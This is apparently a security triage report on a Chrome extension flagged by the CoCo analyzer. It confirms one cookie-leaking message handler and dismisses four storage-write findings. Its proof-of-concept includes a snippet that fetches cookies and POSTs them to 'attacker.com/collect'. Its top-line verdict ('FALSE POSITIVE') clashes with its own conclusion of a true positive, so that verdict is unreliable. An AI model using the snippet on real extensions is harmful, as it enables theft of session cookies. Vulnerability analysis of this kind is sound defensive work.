# CoCo Analysis: chjoanbbbllaihmkkcokfkaojegehmaa

## Summary

- **Overall Assessment:** FALSE POSITIVE
- **Total Sinks Detected:** 5

---

## Sink 1-4: cs_window_eventListener_message → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/chjoanbbbllaihmkkcokfkaojegehmaa/opgen_generated_files/cs_0.js
Line 1856: `window.addEventListener('message', function(event) {`
Line 1858: `if (event.data && event.data.from === 'curiosity-modeller' && event.data.action === 'check-extension') {`
Lines 1868-1871: Storage writes with `event.data.api_url`, `event.data.workspace`, `event.data.project`, `event.data.release`

**Code:**

```javascript
// Content script - cs_0.js Line 1856
window.addEventListener('message', function(event) {
  if (event.source !== window) return;
  if (event.data && event.data.from === 'curiosity-modeller' && event.data.action === 'check-extension') {
    window.postMessage({
      from: 'curiosity-extension'
    }, '*');
  } else if (event.data && event.data.from === 'curiosity-modeller' && event.data.action === 'start-scan') {
    // Set JWT
    chrome.runtime.sendMessage({ operation: 'set_id_token', data: event.data.jwt }); // ← attacker-controlled

    // Set project & release
    chrome.storage.local.set({ ext_mode: 'scanner', service_settings: {
      API_URL: event.data.api_url,     // ← attacker-controlled
      workspace: event.data.workspace,  // ← attacker-controlled
      project_id: event.data.project,   // ← attacker-controlled
      release_id: event.data.release,   // ← attacker-controlled
      ext_mode: 'scanner'
    }});

    // Open URL
    chrome.runtime.sendMessage({ operation: "open_url", data: event.data.url });

    // Start scanner
    chrome.runtime.sendMessage({operation: "record_scanner", start_url:  event.data.url}, function(response) {
      console.log(response);
    });
  }
});
```

**Classification:** FALSE POSITIVE

**Reason:** This is storage poisoning without a complete exploitation chain. While an attacker can write arbitrary data to `chrome.storage.local` via `window.postMessage`, there is no evidence in the CoCo-detected flows that this stored data flows back to the attacker through sendResponse, postMessage, or is used in a subsequent vulnerable operation like fetch to an attacker-controlled URL or executeScript. Storage poisoning alone is not exploitable according to the methodology.

---

## Sink 5: cookies_source → window_postMessage_sink

**CoCo Trace:**
CoCo detected a flow from cookies_source to window_postMessage_sink but provided no specific line numbers in the trace.

**Analysis:**
After examining the code, I found two separate cookie-related flows:

**Flow A: Cookie Exfiltration via sendResponse (TRUE POSITIVE)**
```javascript
// Background script - bg.js Line 1045
chrome.runtime.onMessage.addListener(function (message, sender, sendResponse) {
  if (message.action === "hookAuth") {
    chrome.cookies.getAll({ domain: message.domain }, function (cookies) {
      sendResponse(cookies); // ← Sends all cookies for specified domain back to requester
    });
  }
});
```

**Flow B: Cookie Recording in Action Events**
```javascript
// Content script - cs_0.js
// Line 4373-4384: getCookies function reads document.cookie
var cookieBuilder = {
   getCookies : function() {
     var pairs = document.cookie.split(";");
     var cookies = {};
     for(var i=0; i < pairs.length; i++){
       var pair = pairs[i].split("=");
       cookies[(pair[0]+'').trim()] = unescape(pair[1]);
     }
     return cookies;
   }
};

// Line 4410: Cookies included in action events
var action_event = ActionObject.ConstructObject(
  eng_text, eng_param_text, englishBuilder.elementLabelName(dom_element, x_path).value,
  window.location.href, document.title, getTime(), action_code,
  screenShotCapture.getScreenShotData(event), dom_element.outerHTML,
  cssBuilder.getCSS(dom_element), document.documentElement.outerHTML,
  cookieBuilder.getCookies(), // ← Cookies read from page
  locator
);

// Line 1996: Action sent to background
chrome.runtime.sendMessage({ operation: 'action', action: action_event });

// Background script - bg.js Line 1103, 1119: Action stored
chrome.storage.local.set({action: recorder_actions}, function(data) {
  if(chrome.runtime.lastError){
    alert(chrome.runtime.lastError.message);
  }
});
```

**Classification for Flow A:** TRUE POSITIVE

**Attack Vector:** chrome.runtime.onMessage (content script can trigger)

**Attack:**

```javascript
// Malicious code injected into webpage or malicious content script
chrome.runtime.sendMessage({
  action: "hookAuth",
  domain: "example.com" // ← attacker specifies target domain
}, function(response) {
  console.log("Stolen cookies:", response);
  // Exfiltrate to attacker server
  fetch("https://attacker.com/collect", {
    method: "POST",
    body: JSON.stringify(response)
  });
});
```

**Impact:** Information disclosure - An attacker can exfiltrate all cookies for any specified domain that the browser has access to, including session tokens, authentication credentials, and other sensitive data.

**Classification for Flow B:** FALSE POSITIVE

**Reason:** While cookies from `document.cookie` are collected and stored in `chrome.storage.local` as part of action events, this is incomplete storage exploitation. The cookies are stored but there is no retrieval path where this stored data flows back to an attacker through sendResponse, postMessage, or is used in attacker-controlled operations. The extension records user actions for legitimate testing/quality assurance purposes, and the stored data is not made accessible to external attackers.

---

## Overall Assessment Explanation

Extension chjoanbbbllaihmkkcokfkaojegehmaa has **one TRUE POSITIVE vulnerability** (cookie exfiltration via the hookAuth message handler) and **four FALSE POSITIVE detections** (storage poisoning without retrieval paths).

The TRUE POSITIVE allows an attacker to steal cookies for arbitrary domains through the `hookAuth` message handler that responds with all cookies for a requested domain. This represents a serious information disclosure vulnerability.

The FALSE POSITIVES relate to storage poisoning attacks that lack complete exploitation chains - while attackers can write data to storage, there are no paths for retrieving this data back or using it in exploitable operations.
